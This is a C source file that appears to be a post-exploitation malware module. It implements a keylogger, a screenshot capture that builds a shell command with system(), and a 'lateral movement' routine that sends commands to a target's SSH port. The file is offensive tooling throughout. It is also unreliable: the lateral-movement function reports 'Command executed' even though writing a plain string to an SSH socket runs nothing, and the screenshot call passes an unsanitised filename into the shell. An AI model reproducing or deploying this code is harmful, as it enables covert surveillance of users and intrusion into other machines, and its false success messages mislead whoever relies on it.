#include "postexp.h"
#include <signal.h>
#include <fcntl.h>
#include <time.h>
#include <arpa/inet.h>
#include <unistd.h>

static int keylog_fd = -1; // File descriptor for keylogging
static volatile int keylogging_active = 0; // Flag for keylogging status

void keylogger_signal_handler(int signum) {
    // Stop keylogging on receiving termination signal
    if (signum == SIGUSR1) {
        keylogging_active = 0;
    }
}

void start_keylogging(const char *output_file) {
    if (keylogging_active) {
        printf("Keylogging is already active.\n");
        return;
    }

    keylog_fd = open(output_file, O_WRONLY | O_CREAT | O_APPEND, 0600);
    if (keylog_fd == -1) {
        perror("Failed to open keylog file");
        return;
    }

    keylogging_active = 1;
    signal(SIGUSR1, keylogger_signal_handler);

    printf("Keylogging started. Output file: %s\n", output_file);

    char buffer[1024]; // Increased buffer size to 1024 bytes
    while (keylogging_active) {
        ssize_t bytes_read = read(STDIN_FILENO, buffer, sizeof(buffer) - 1);
        if (bytes_read > 0) {
            buffer[bytes_read] = '\0';
            write(keylog_fd, buffer, bytes_read);
        }
        usleep(100000); // Slight delay to avoid high CPU usage
    }

    close(keylog_fd);
    keylog_fd = -1;
    printf("Keylogging stopped.\n");
}

void stop_keylogging() {
    if (!keylogging_active) {
        printf("Keylogging is not active.\n");
        return;
    }
    raise(SIGUSR1); // Send signal to stop keylogging
}

void capture_screenshot(const char *output_file) {
#ifdef __linux__
    const char *cmd = "import -window root "; // Use ImageMagick's `import` tool
    char full_command[1024]; // Increased buffer size to 1024 bytes
    snprintf(full_command, sizeof(full_command), "%s %s", cmd, output_file);
    system(full_command);
    printf("Screenshot saved to %s\n", output_file);
#else
    printf("Screenshot capture is not implemented for this platform.\n");
#endif
}

void lateral_movement(const char *target_ip, const char *command) {
    int sockfd;
    struct sockaddr_in target_addr;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Failed to create socket");
        return;
    }

    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(22); // Default SSH port
    if (inet_pton(AF_INET, target_ip, &target_addr.sin_addr) <= 0) {
        perror("Invalid target IP address");
        close(sockfd);
        return;
    }

    if (connect(sockfd, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
        perror("Failed to connect to target");
        close(sockfd);
        return;
    }

    printf("Connected to target: %s\n", target_ip);

    char buffer[1024]; // Increased buffer size to 1024 bytes
    snprintf(buffer, sizeof(buffer), "%s\n", command);
    write(sockfd, buffer, strlen(buffer));

    close(sockfd);
    printf("Command executed on target: %s\n", target_ip);
}